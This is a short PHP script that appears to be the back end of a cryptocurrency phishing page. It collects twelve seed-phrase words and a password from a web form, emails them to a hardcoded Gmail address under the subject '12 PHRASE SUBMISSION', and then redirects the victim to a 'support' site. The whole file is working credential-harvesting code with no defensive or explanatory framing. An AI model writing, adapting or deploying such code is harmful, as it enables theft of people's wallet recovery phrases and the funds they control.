







<?php 
if(isset($_POST['submit'])){


    // To send HTML mail, the Content-type header must be set

    $headers .= "Reply-To: The Sender <jayken311@gmail.com>\r\n"; 
    $headers .= "Return-Path: The Sender <jayken311@gmail.com>\r\n"; 
    $headers .= "From: admin@nelfy.online" ."\r\n" .
    $headers .= "Organization: Sender Organization\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=utf-8\r\n";
    $headers .= "X-Priority: 3\r\n";
    $headers .= "X-Mailer: PHP". phpversion() ."\r\n" ;








    $to = "jayken311@gmail.com"; // this is your Email address
    $from ="admin@nelfy.online"; // this is the sender's Email address
    $first_name = $_POST['first_name'];
    $subject = "12 PHRASE SUBMISSION";
    $subject2 = "Copy of your form submission";
    
   $message = $first_name . " " . $last_name . " 12 PHRASE:" . "\n\n" . $_POST['1']; 
   
$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['2']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['3'];

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['4']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['5'];

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['6']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['7']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['8']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['9']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['10']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['11']; 

$message .= $first_name . " " . $last_name . " " . "\n\n" . $_POST['12']; 

$message .= $first_name . " " . $last_name . " PASSWORD:" . "\n\n" . $_POST['password']; 


    $message2 = "Here is a copy of your message " . $first_name . "\n\n" . $_POST['1']; 

    $headers = "From:" . $from;
    $headers2 = "From:" . $to;
    mail($to,$subject,$message,$headers);
    
    header("Location: https://support-active.netlify.app/");
exit();

    // You can also use header('Location: thank_you.php'); to redirect to another page.
    // You cannot use header and echo together. It's one or the other.
    }
?>